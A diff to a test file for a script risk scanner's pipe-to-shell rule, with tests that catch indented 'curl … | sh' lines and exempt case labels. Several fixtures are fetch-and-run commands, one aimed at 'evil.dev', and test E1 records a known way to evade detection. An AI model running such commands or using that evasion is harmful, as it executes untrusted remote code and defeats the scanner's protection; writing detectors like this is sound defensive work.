@@ -4566,7 +4566,10 @@ test('T3.3-C1 不变量：severity/category/title/advice 与管道右半、`<(` 
     `sink 词表那半边被改到了：${src}`);
   assert.ok(src.includes('(?:curl|wget|busybox\\s+wget|busybox\\s+curl)'), `下载器写法面被改到了：${src}`);
   assert.ok(src.includes('\\b(?:sh|bash|ash)\\s*<\\(\\s*(?:curl|wget)\\b'), `第二支 <( 被改到了：${src}`);
-  assert.ok(src.startsWith('(?:^|[|;&`(]\\s*|'), `第一支（改前的整个左边界）必须还在：${src}`);
+  // Task 3.4 把 `^` 收成 `^\s*`（缩进裸写的管道就是本轮要闭的那一格），所以这颗钉子跟着换成收缩后的新前缀；
+  // 右半三段照旧逐字对账（上面三条 includes 一字未动 —— 标签豁免的负向前瞻拼在下载器组与 `\b` **之间**，
+  // 右半的字节面没有被切开，工单 §2「右半三段照旧逐字对账」要的就是这个字节面）。
+  assert.ok(src.startsWith('(?:^\\s*|[|;&`(]\\s*|'), `第一支（Task 3.4 收缩后的左边界）必须是新前缀：${src}`);
   // 行为层对账：改前改后同一个值的几形
   assert.deepEqual(t33pipe(t33body(T33_SHE, 'sh <(curl -s https://x.dev/a)')), ['2/high'], '第二支 `<(` 那一支照旧');
   assert.deepEqual(t33pipe(t33body(T33_SHE, 'curl http://a.b | busybox sh')), ['2/high'], 'sink 词表那一半照旧');
@@ -4608,29 +4611,207 @@ test('T3.3-D1 形状：左边界读的就是那张具名表 —— pattern 里�
   assert.ok(leftPart.includes(')+'), '控制词那一支必须是重复形：组合形 if ! curl … | sh 靠它');
 });
 
-test('T3.3-D2 观察（本轮不修，交回主控）：缩进的裸 `curl … | sh` 仍然 0 —— 左边界只往控制词那一格加宽', () => {
-  // 跑实验量出来的另一格：`^` 那一支后面没有 `\s*`，所以**行首带缩进**的裸管道今天也不命中。
-  // 它与控制词无关，收它会直接改变真包里缩进写法的命中面（工单 §4.4 期望 −0/+0），本轮不动它，
-  // 只把它钉成观察 —— 免得下一轮把它读成「已经接住」。
-  assert.deepEqual(t33pipe(t33body(T33_SHE, '    curl -s https://x.dev/a | sh')), [],
-    '缩进 + 裸管道：改前 0，本轮之后仍然 0（不在工单 §2 的授权面里）');
+test('T3.3-D2 观察（Task 3.4 已闭）：缩进的裸 `curl … | sh` 现在是 1 命中 —— 左边界收缩进缩进', () => {
+  // 跑实验量出来的另一格：改前 `^` 那一支后面没有 `\s*`，所以**行首带缩进**的裸管道当时也不命中。
+  // T3.3 那轮它只是观察（工单 §2 当时不许动，钉在这儿免得下一轮把它读成「已经接住」）；
+  // Task 3.4 把 `^` 收成 `^\s*` ⇒ 这一格已闭，期望从 0 翻成 1（工单 §2 授权的唯一翻期望）。
+  // **这条夹具本体不许删** —— 它是这格历史上曾经漏检的证据（33fc2f2 钉下的逐字观察原文还在下面）。
+  assert.deepEqual(t33pipe(t33body(T33_SHE, '    curl -s https://x.dev/a | sh')), ['2/high'],
+    '缩进 + 裸管道：改前 0（这条就是当初那格观察），Task 3.4 收缩进之后是 1 命中');
   assert.deepEqual(t33pipe(t33body(T33_SHE, 'curl -s https://x.dev/a | sh')), ['2/high'],
-    '同一形状不带缩进照旧命中：上面那个 0 不是本轮改出来的');
+    '同一形状不带缩进照旧命中：收缩进没有动顶格那一支的行为');
   // 同一族的另一格（工单 §2 明令 `sh -c <(curl …)` 那一支不动）：第二支要求解释器**紧跟** `<(`，
   // 所以 `sh -c <(curl …)` 今天不命中。改前改后同一个值，钉在这儿免得下一轮把它读成「已经接住」。
   assert.deepEqual(t33pipe(t33body(T33_SHE, 'sh -c <(curl -s https://x.dev/a)')), [],
     '`<(` 那一支的中间多一个 `-c` 就不命中 —— 本轮没动那一支，这是既有限度不是新洞');
   assert.deepEqual(t33pipe(t33body(T33_SHE, 'sh <(curl -s https://x.dev/a)')), ['2/high'],
     '去掉 `-c` 那一格照旧命中：上面那个 0 是那一支自己的形状，不是规则整体失效');
-  // 真包活体（这就是本轮不把 `^\s*` 加到**裸管道**那一支的理由）：
-  // entware-installer-for-magisk-master/customize.sh:142 逐字
+  // 真包活体（本轮收缩进就是为了它）：entware-installer-for-magisk-master/customize.sh:142 逐字
   //   '    wget -O - "http://bin.entware.net/$ENTWARE_ARCH/installer/generic.sh" | sh'
-  // 行首带四个空格的裸管道 ⇒ 改前 0、本轮之后仍然 0。收它会立刻把 18 包差集从 −0/+0 变成 +1，
-  // 而那一格的误伤数据本轮没量（工单 §4.4）⇒ 交回主控，不动。整包 high/block 是别的规则说的。
+  // 改前 0 命中、整包 low/auto-approve 的是**这一格本身**（工单 §0 表 P1；整包 high/block 是别的规则说的）；
+  // Task 3.4 之后 1 命中 ⇒ 这格终于被报出来（18 包差集 −0/+1 加的就是它，逐字夹具见 T3.4-A1）。
   const entware142 = '    wget -O - "http://bin.entware.net/$ENTWARE_ARCH/installer/generic.sh" | sh';
-  assert.deepEqual(t33pipe(t33body(T33_SHE, entware142)), [],
-    '真包那一行今天就是 0 命中：缩进 + 裸管道，不在工单 §2 的授权面里');
+  assert.deepEqual(t33pipe(t33body(T33_SHE, entware142)), ['2/high'],
+    '真包那一行：改前就是这条观察的 0，Task 3.4 闭掉 ⇒ 1 命中');
   assert.deepEqual(t33pipe(t33body(T33_SHE, entware142.trim())), ['2/high'],
-    '同一行去掉行首缩进就命中 ⇒ 上面那个 0 的原因就是 `^` 那一支不接空白，不是规则没看见管道');
+    '同一行去掉行首缩进照旧命中：闭进来的那一格与既有那一格现在是同一个判据');
 });
+
+// ===========================================================================
+// Task 3.4 —— PIPE_TO_SHELL 收缩进缩进裸写 + case 标签豁免
+// ===========================================================================
+// 需求来源：工单 `briefs/task-3.4.md` §2/§3。背景：计划 §0.20（`60edb58` 的打桩数据）、
+// task-3.3-report.md（D2 那一格观察）、台账「2026-10-14 同日第四批」。
+// 性质两条都不许漏（工单 §0）：
+//   ① 「远程脚本直接喂给 shell」这条最硬的禁令，在**缩进写法**上 main 今天完全不咬 ⇒ 加严；
+//   ② N6（顶格 `curl)`／`wget)` 标签行被当成命令）是 main 与分支今天都在误报的一格 ⇒ 本轮的
+//      标签豁免把它闭掉 —— 放宽的只有「标签不是命令」这一格，18 包实测 −0，没有任何真包因它翻结论。
+// 改前实际值（本会话在副本 4582970 上用 `probe-laneA.mjs` 逐形实测，与工单 §0 两张表逐格一致）：
+//   A1/A2/A3/A4/D2 缩进裸写 = 0 命中、整包 low/auto-approve；A6 = 0（缩进裸写的另一形）；
+//   A5 = 1（走 `<(` 第二支，改前就咬）；N1–N5 = 0；N6 = 1/high、整包 high/block；E1 = 0、low/auto-approve。
+// 断言口径与 T3/T3.3 相同：每条 deepEqual 到**精确 findings 多重集合**，不写 some(...)。
+const T34_LINE = {
+  a1: '    wget -O - "http://bin.entware.net/$ENTWARE_ARCH/installer/generic.sh" | sh',
+  a2: '    curl -sL "http://bin.entware.net/a/generic.sh" | sh',
+  a3: '  curl -s https://x.dev/a | sh',
+  a4: '        busybox wget -qO- https://x.dev/a | sh',
+  a5: '    sh <(curl -s https://x.dev/a)',
+  a6: '    curl -s https://x.dev/a -o /dev/null (echo) | sh',
+  n1: '        curl)    busybox wget -qO- https://x.dev/a | sh ;;',
+  n2: '        wget)    busybox wget -qO- https://x.dev/b | sh ;;',
+  n3: '    case "$TOOL" in curl) busybox wget -qO- https://x.dev/a | sh ;; esac',
+  n4: '    ui_print "curl -s https://x.dev/a | sh 是禁止的写法"',
+  n5: '    # curl -s https://x.dev/a | sh',
+  n6: 'curl) busybox wget -qO- https://x.dev/a | sh ;;',
+  e1: '    curl) curl -s https://evil.dev/x | sh ;;',
+};
+
+// —— §3 正面：每条 1 命中 PIPE_TO_SHELL/high + 整包 high/block ——
+
+async function t34positive(key, extra) {
+  const line = T34_LINE[key];
+  assert.deepEqual(t33pipe(t33body(T33_SHE, line)), ['2/high'],
+    `${key}：缩进裸写的管道必须恰好 1 条 PIPE_TO_SHELL/high（左边界退回顶格 ^ = 变异 M2，红在这一格）`);
+  const r = await t3scan(`eval.t34${key}`, t33body(T33_SHE, line));
+  assert.deepEqual(t3spots(r, 'PIPE_TO_SHELL'), ['service.sh:2/high'], `${key}：报告落点与文本层一致`);
+  assert.deepEqual(t3set(r), extra, `${key}：整包 findings 多重集合逐条钉死`);
+  assert.equal(r.riskLevel, 'high', `${key}：整包等级`);
+  assert.equal(r.decision.action, 'block', `${key}：这一形改前是 low/auto-approve —— 闭的就是机器人自动合并那一格`);
+  return r;
+}
+
+test('T3.4-A1 正面（真包逐字，工单 §0 P1 / §3 A1）：entware customize.sh:142 的 4 空格缩进裸管道 ⇒ 1 命中 + 整包 high/block', async () => {
+  // arbv/entware-installer-for-magisk-master/customize.sh:142 逐字（行首 4 个空格）。
+  // 改前 0 命中、整包 low/auto-approve 的是**这一格**（工单 §0 表 P1）；整包 high/block 是别的规则说的
+  // —— 本轮战果是「这格终于被报出来了」，不是「拦住了一个新包」（工单 §4.8 的口径）。
+  // 改前该合成包 set=['DOWNLOAD_TO_STDOUT/low','NETWORK_FETCH/low']（probe-laneA 实测），改后加一条 PIPE_TO_SHELL/high。
+  await t34positive('a1', ['DOWNLOAD_TO_STDOUT/low', 'NETWORK_FETCH/low', 'PIPE_TO_SHELL/high']);
+});
+
+test('T3.4-A2 正面（工单 §0 P2）：curl -sL 版缩进 ⇒ 1 命中 + 整包 high/block', async () => {
+  await t34positive('a2', ['NETWORK_FETCH/low', 'PIPE_TO_SHELL/high']);
+});
+
+test('T3.4-A3 正面（工单 §0 P3）：缩进两格的裸管道 ⇒ 1 命中 + 整包 high/block', async () => {
+  await t34positive('a3', ['NETWORK_FETCH/low', 'PIPE_TO_SHELL/high']);
+});
+
+test('T3.4-A4 正面（工单 §3 A4）：缩进 8 格 + busybox wget -qO- ⇒ 1 命中 + 整包 high/block', async () => {
+  await t34positive('a4', ['NETWORK_FETCH/low', 'PIPE_TO_SHELL/high']);
+});
+
+test('T3.4-A5 正面（工单 §3 A5 交叉形）：缩进的 `sh <(curl …)` 仍 1 命中 —— 走 `<(` 第二支，本轮没碰它', async () => {
+  // 工单 §2：第二支一字不动。这一形的 1 命中改前改后同值（probe 实测改前就是 ['2/high']），
+  // 它钉的是「收缩进 + 豁免都没把 `<(` 那一支碰歪」，不是本轮的新捕获。
+  await t34positive('a5', ['NETWORK_FETCH/low', 'PIPE_TO_SHELL/high']);
+});
+
+test('T3.4-A6 正面（工单 §3 A6）：标签豁免不许外溢 —— `)` 出现在下载器后面远处时照旧命中', async () => {
+  // `    curl -s https://x.dev/a -o /dev/null (echo) | sh`：`)` 不紧跟下载器 ⇒ 豁免不许咬这一格。
+  // 工单 §3 明令「跑出来是多少就钉多少，不许为了让它绿而改判据」—— 改前（无收缩进）= 0，
+  // 打桩态与实现态实测都是 1/high（probe-laneA.mjs 两份输出逐字可查），钉成 1。
+  await t34positive('a6', ['NETWORK_FETCH/low', 'PIPE_TO_SHELL/high']);
+});
+
+// —— §3 反面：一条都不许多，且整包结论不许变松 ——
+
+test('T3.4-B1 反面（工单 §0 N1/N2，B4 那两行在缩进这一格重新钉一遍）：缩进标签行 0 命中，整包结论一字不变', async () => {
+  // 这两形在 T3.3-B4 的块状夹具里已经钉过，但那一处没单独走整包结论，本轮收缩进之后
+  // 标签行**第一次**站在了 `^\s*` 左边界上 —— 全靠紧跟 `)` 的豁免回到 0（摘掉豁免 = 变异 M1，红在这里）。
+  // 改前实测（probe-laneA，分支 4582970）：两形都是 pipe=0、set=['NETWORK_FETCH/low']、low/auto-approve；
+  // 「不许变松」钉的就是这四个值改前改后逐字相同。
+  for (const key of ['n1', 'n2']) {
+    const line = T34_LINE[key];
+    assert.deepEqual(t33pipe(t33body(T33_SHE, line)), [], `${key}：标签不是命令，收缩进之后仍必须 0 命中（豁免被摘 = 变异 M1 红在此）`);
+    const r = await t3scan(`eval.t34${key}`, t33body(T33_SHE, line));
+    assert.deepEqual(t3set(r), ['NETWORK_FETCH/low'], `${key}：整包 findings 一条都不许多`);
+    assert.equal(r.riskLevel, 'low', `${key}：改前就是 low —— 结论不许因此轮变松或变紧`);
+    assert.equal(r.decision.action, 'auto-approve', `${key}：改前改后同一个结论（工单 §0 表 N1/N2 分支列全 0）`);
+  }
+});
+
+test('T3.4-B2 反面（工单 §0 N3/N4/N5）：一行式 case、引号里散文、缩进纯注释 ⇒ 收缩进之后照旧 0 命中', async () => {
+  // N3 一行式 case：`in` 不在控制词表里、`curl)` 是标签、`busybox wget` 前面没有语句边界 ⇒ 0。
+  // N4/N5：引号与 `#` 都不是左边界字符，`^\s*` 收缩进只接**空白**，不接 `"` 或 `#` ⇒ 0。
+  // 三条改前改后同值（probe-laneA 两份输出），整包都只有 NETWORK_FETCH/low。
+  for (const key of ['n3', 'n4', 'n5']) {
+    const line = T34_LINE[key];
+    assert.deepEqual(t33pipe(t33body(T33_SHE, line)), [], `${key}：必须还是 0（收缩进或豁免哪一半做宽了都会红在这里）`);
+    const r = await t3scan(`eval.t34${key}`, t33body(T33_SHE, line));
+    assert.deepEqual(t3set(r), ['NETWORK_FETCH/low'], `${key}：整包 findings 一条都不许多`);
+    assert.equal(r.riskLevel, 'low');
+    assert.equal(r.decision.action, 'auto-approve');
+  }
+});
+
+test('T3.4-B3 反面（工单 §0 N6，本轮顺手闭掉的那格误报）：顶格 `curl)` 标签改后 0 命中', async () => {
+  // 改前实测（本会话与主控一致，工单 §0 表 N6 行）：**main（shipped）与分支 4582970 都是 1/high、整包 high/block** ——
+  // 顶格的 `curl)`／`wget)` 标签行被既有 `^` 左边界当成命令，这是今天就在误报的一格。
+  // 本轮的标签豁免把它闭掉（放宽的只有「标签不是命令」这一格；18 包实测 −0，没有真包因它翻结论）。
+  // 摘掉豁免（变异 M1）⇒ 这一格回到 1/high 当场红 —— 证明豁免在咬，而且顶格支与缩进支共用同一条前瞻。
+  assert.deepEqual(t33pipe(t33body(T33_SHE, T34_LINE.n6)), [],
+    'N6：顶格标签改前是 1/high（main 与分支同值，见注释），Task 3.4 之后必须是 0');
+  const r = await t3scan('eval.t34n6', t33body(T33_SHE, T34_LINE.n6));
+  assert.deepEqual(t3set(r), ['NETWORK_FETCH/low'], 'N6：改后整包只剩 NETWORK_FETCH/low —— 误报的高等级来源没了');
+  assert.equal(r.riskLevel, 'low', 'N6：改前 high（误报），闭掉后 low —— 这是工单 §0② 授权的那一格放宽');
+  assert.equal(r.decision.action, 'auto-approve', 'N6：改前 block（误报拦下的正当标签行）');
+});
+
+// —— §3 观察：不修，交回主控 ——
+
+test('T3.4-E1 观察（不修，交回主控）：缩进 `curl)` 标签后面接真管道仍然 0 —— 豁免判据新开的一条逃逸道', async () => {
+  // `    curl) curl -s https://evil.dev/x | sh ;;` —— 标签形状**后面**跟着真下载真管道。
+  // 左边界要求下载器词站在 `^\s*` 或边界符/控制词之后：第二个 `curl` 前面是 `curl) `，`)` 与空格都不是边界符；
+  // 第一个 `curl` 又被豁免前瞻挡掉 ⇒ 0 命中、整包 low/auto-approve（工单 §3 给的期望，probe 实测一致）。
+  // 这是收缩进 + 标签豁免**新开**的逃逸道：上一轮的左边界根本不认缩进，这一格连形状都不成立。
+  // 本轮不收它：收了（比如「标签后面再出现下载器就翻回命中」）就等于把 N1/N2/N6 那格误报再开回去——
+  // 判据在「豁免紧跟 `)`」与「豁免后面接命令」之间是同一格形状的两侧。写进报告「新开的一条逃逸道」一节。
+  assert.deepEqual(t33pipe(t33body(T33_SHE, T34_LINE.e1)), [],
+    'E1：逃逸道按工单 §3 保持漏检 —— 期望值就是 0，改动它 = 越出授权范围');
+  const r = await t3scan('eval.t34e1', t33body(T33_SHE, T34_LINE.e1));
+  assert.deepEqual(t3set(r), ['NETWORK_FETCH/low'], 'E1：整包只有 NETWORK_FETCH/low（工单 §3：0 / low / auto-approve）');
+  assert.equal(r.riskLevel, 'low');
+  assert.equal(r.decision.action, 'auto-approve');
+});
+
+// —— §3 不变量：豁免是具名单一常量、只出现一次；左边界形状对账 ——
+
+test('T3.4-C1 不变量：CASE_LABEL_GUARD 是具名单一常量，且在 pattern.source 里逐字面量只出现一次', () => {
+  // 工单 §2：「只许出现一次：两处都加 = 两份口径，早晚分叉」—— 按 pattern.source 数字面量出现次数 = 1。
+  // 第二支 `<(` 没有标签形状 ⇒ 那里必须没有前瞻。
+  const src = readFileSync(new URL('./risk-rules.mjs', import.meta.url), 'utf8');
+  assert.equal((src.match(/const CASE_LABEL_GUARD =/g) || []).length, 1, '豁免判据必须是**具名单一常量**（声明恰好一次）');
+  assert.equal((src.match(/\$\{CASE_LABEL_GUARD\}/g) || []).length, 1, '它只许被拼进 pattern **一次**（两处都加 = 两份口径）');
+  const pattern = RULES_BY_ID.PIPE_TO_SHELL.pattern.source;
+  const needle = '(?!\\s*\\))'; // pattern.source 里的字节面：(?!\s*\))
+  assert.equal(pattern.split(needle).length - 1, 1, `豁免前瞻在 pattern.source 里只许出现一次：${pattern}`);
+  assert.equal(pattern.split('(?!').length - 1, 1, '整个 pattern 里负向前瞻只许这一条（不许顺手藏第二条）');
+});
+
+test('T3.4-C2 不变量：左边界收缩进第一支，SHELL_STATEMENT_START 与 `<(` 第二支的字节面一字未动', () => {
+  // 工单 §2：`^\s*` 只加在第一支（`SHELL_STATEMENT_START` 里本来就有 `^\s*`，那一支不动）；
+  // 右半 `\|[^\n]*\b(?:sh|bash|…)\b`、`[^\n|]*` 那一段、severity/category/title/advice/anchor 都在 T3.3-C1 钉着，
+  // 这里补的是本轮自己那两条：新前缀的形状与第二支的逐字节面。
+  const pattern = RULES_BY_ID.PIPE_TO_SHELL.pattern.source;
+  const leftPart = pattern.slice(0, pattern.indexOf('(?:curl|wget'));
+  assert.ok(leftPart.startsWith('(?:^\\s*|[|;&`(]\\s*|'), `收缩后的第一支必须是左边界头：${pattern}`);
+  assert.ok(pattern.includes('(?:^\\s*|[|;&`(]\\s*)(?:'), 'SHELL_STATEMENT_START 里那个本来就有的 ^\\s* 一支本轮不动（它必须还在原位原样）');
+  assert.ok(pattern.includes('\\b(?:sh|bash|ash)\\s*<\\(\\s*(?:curl|wget)\\b'), '`<(` 第二支逐字节面一字未动（它没有前瞻）');
+  assert.equal(RULES_BY_ID.PIPE_TO_SHELL.severity, 'high', 'severity 不动（工单 §2「不许动的」）');
+  assert.equal(RULES_BY_ID.PIPE_TO_SHELL.anchor, 'anywhere', '锚点声明不动（闭包表继续按 x=1; 前缀验它）');
+});
+
+test('T3.4-C3 不变量：母本与副本的 risk-rules 是同一份字节 —— 谁只改一边，这里当场红', () => {
+  // 工单 §4.6 的 parity 纪律在测试面上的投影：副本（repo/audit）与母本（contrib/audit）互为兄弟目录，
+  // 两边跑同一份测试时各自把**对面那份**读进来逐字节对账；Temp 打桩副本没有仓外兄弟文件 ⇒ 两条候选路径
+  // 都不存在，测试自动放行（这就是基线里那条「环境伪影」同类现象，不硬失败）。
+  const local = readFileSync(new URL('./risk-rules.mjs', import.meta.url), 'utf8');
+  for (const rel of ['../../audit/risk-rules.mjs', '../repo/audit/risk-rules.mjs']) {
+    const sib = new URL(rel, import.meta.url);
+    if (!existsSync(sib)) continue;
+    assert.equal(readFileSync(sib, 'utf8'), local,
+      `仓外兄弟文件 ${rel} 与本地不是同一份字节：母本/副本必须先同步再跑`);
+  }
+});
+
 
